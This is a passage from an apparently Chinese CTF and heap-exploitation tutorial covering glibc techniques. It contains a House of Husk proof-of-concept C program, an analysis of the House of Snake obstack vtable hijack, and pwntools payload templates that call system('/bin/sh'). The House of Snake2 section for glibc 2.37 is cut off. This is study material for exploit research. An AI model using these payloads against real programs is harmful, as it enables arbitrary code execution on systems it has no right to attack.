class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="例题-8"><a href="#例题-8" class="headerlink" title="例题"></a>例题</h2><p><strong>34c4_readme_revenge</strong></p>
<h1 id="house-of-snake"><a href="#house-of-snake" class="headerlink" title="house of snake"></a>house of snake</h1><h2 id="概要-19"><a href="#概要-19" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>此利用与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是修改虚表指针为<code>_IO_obstack_jumps</code>实现攻击。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)<strong>或</strong>劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li>
<li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数,或者main正常退出,或者exit退出。</li>
<li>能够泄露堆地址和<code>libc</code>基址。</li>
</ol>
<p><strong>利用效果:</strong>程序流执行</p>
<p><strong>有效版本:</strong>2.36及以前,2,37去除了_IO_obstack_jumps</p>
<h2 id="原理-19"><a href="#原理-19" class="headerlink" title="原理"></a>原理</h2><p>在glibc/malloc/obstack.h中声定义一个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">				      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">				      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">				      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">				     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">				     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其又被包装于glibc/libcio/obprintf.c中的_IO_obstack_file结构体中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>简单来说，就是给<code>_IO_FILE_plus</code><strong>追加了一个指向<code>obstack</code>结构体的指针</strong>。</p>
<p><strong>_IO_obstack_jumps</strong></p>
<p>由上可知，<code>vtable</code>必须合法，我们观察以下<code>vtable</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow), 	<span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),	<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>。</p>
<p>接下来我们对<code>_IO_obstack_xsputn</code>这个函数进行分析(glibc/libcio/obprintf.c)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment">	 space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察该函数，首先获得<code>_IO_obstack_file</code>结构体中的<code>obstack</code>结构体指针作为后面函数运行的参数。然后<strong>要绕过fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</strong>，执行<code>obstack_blank_fast(obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</code>，</p>
<p>而<code>obstack_blank_fast</code>是个宏定义源码如下：</p>
<p><code>#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</code></p>
<p>对此<strong>不过多关注</strong>。然后执行<code>obstack_grow</code>，<code>obstack_grow</code>也是一个宏源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>
<p>可以看到，当<strong>_o-&gt;next_free + <strong>len &gt; </strong>o-&gt;chunk_limit</strong>时，调用<code>_obstack_newchunk</code>，<code>_obstack_newchunk</code>函数源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">    [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对此，我们关注<code>CALL_CHUNKFUN</code>这个宏定义，<code>CALL_CHUNKFUN</code>源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)							      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure>
<p>当use_extra_arg不为0,可以控制任意函数执行,并且第一个参数可控,第二个也可控不过比较麻烦也没必要</p>
<h3 id="绕过条件"><a href="#绕过条件" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>总结一下需要绕过的条件：</p>
<ul>
<li><code>fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</code></li>
<li><code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code>不为0</li>
</ul>
<h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a>函数调用链</h3><p>从调用<code>_IO_obstack_xsputn</code>开始分析，假设满足上述所有需要绕过的所有条件，得以下调用链：</p>
<ul>
<li>_IO_obstack_xsputn<ul>
<li>obstack_grow<ul>
<li>_obstack_newchunk<ul>
<li>CALL_CHUNKFUN(一个宏定义)<ul>
<li>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1"><a href="#模板方案1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p>该方案主要是利用比较少的字节完成攻击（将fp和obstack指向同个地址）</p>
<ul>
<li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li>
<li><code>chunk A</code>内偏移为0x18处设为1（<code>next_free</code>)</li>
<li><code>chunk A</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li>
<li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li>
<li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li>
<li><code>chunk A</code>内偏移为0x38处设为<code>system</code>函数的地址</li>
<li><code>chunk A</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li>
<li><code>chunk A</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li>
<li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li>
<li><code>chunk A</code>内偏移为0xe0处设置<code>chunk A</code>的地址作为<code>obstack</code>结构体</li>
</ul>
<p>可参考<code>payload</code>如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line">		<span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">		<span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">		<span class="number">0x38</span>:address_for_call,</span><br><span class="line">		<span class="number">0x48</span>:address_for_rdi,</span><br><span class="line">		<span class="number">0x50</span>:<span class="number">1</span>,	</span><br><span class="line">		<span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>,</span><br><span class="line">		<span class="number">0xe0</span>:this_mem_address,</span><br><span class="line">	&#125;,</span><br><span class="line">	filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="模板方案2"><a href="#模板方案2" class="headerlink" title="模板方案2"></a>模板方案2</h3><p>将fp与obstack分开指向不同的地址，方便区分，而易于理解</p>
<ul>
<li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li>
<li>记一块可控堆内存为B</li>
<li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li>
<li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li>
<li><code>chunk A</code>内偏移为0xe0处设置<code>chunk B</code>的地址作为<code>obstack</code>结构体</li>
<li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li>
<li><code>chunk B</code>内偏移为0x18处设为1（<code>next_free</code>)</li>
<li><code>chunk B</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li>
<li><code>chunk B</code>内偏移为0x38处设为<code>system</code>函数的地址</li>
<li><code>chunk B</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li>
<li><code>chunk B</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li>
</ul>
<p>可参考的<code>payload</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">obstack_pd = flat(</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x18</span>:<span class="number">0x1</span>,</span><br><span class="line">		<span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">		<span class="number">0x38</span>:libc_base + libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">		<span class="number">0x48</span>:binsh,</span><br><span class="line">		<span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">	&#125;,</span><br><span class="line">	filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">		<span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">		<span class="number">0xd8</span>:libc_base + get_IO_str_jumps() - <span class="number">0x300</span> + <span class="number">0x20</span>,</span><br><span class="line">		<span class="number">0xe0</span>:heap_base + <span class="number">0x250</span> + <span class="number">0x100</span>,</span><br><span class="line">		<span class="number">0x100</span>:obstack_pd</span><br><span class="line">	&#125;,</span><br><span class="line">	filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h1 id="house-of-snake2"><a href="#house-of-snake2" class="headerlink" title="house of snake2"></a>house of snake2</h1><h2 id="概要-20"><a href="#概要-20" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>glibc2.37</code>删除了<code>_IO_obstack_jumps</code>这个<code>vtable</code>。但是在源码里obstack结构体依然存在,在此，<code>house of snake</code>利用链与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是伪造相关结构体并且修改虚表指针为<code>_IO_printf_buffer_as_file_jumps</code>实现攻击</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li>
<li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数,正常退出。</li>
<li>能够泄露堆地址和<code>libc</code>基址。</li>
</ol>
<p><strong>利用效果:</strong>程序流执行</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-20"><a href="#原理-20" class="headerlink" title="原理"></a>原理</h2><p>house of snake2也利用了obstack这个结构体</p>
<p>在house of snake中obstack被包装于_IO_obstack_file中</p>
<p>但在2.37以后被包装于__printf_buffer_obstack结构体中(glibc/libcio/obstack.c)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* obstack_1grow is called for compatibility reasons.  This needs</span></span><br><span class="line"><span class="comment">     one extra character, and this is the backing store for it.  */</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base; 	<span class="number">0x0</span><span class="number">-0x8</span></span><br><span class="line">  <span class="type">char</span> *write_ptr;		<span class="number">0x8</span><span class="number">-0x10</span></span><br><span class="line">  <span class="type">char</span> *write_end;		<span class="number">0x10</span><span class="number">-0x18</span></span><br><span class="line">  <span class="type">uint64_t</span> written;		<span class="number">0x18</span><span class="number">-0x20</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span> <span class="number">0x20</span><span class="number">-0x24</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
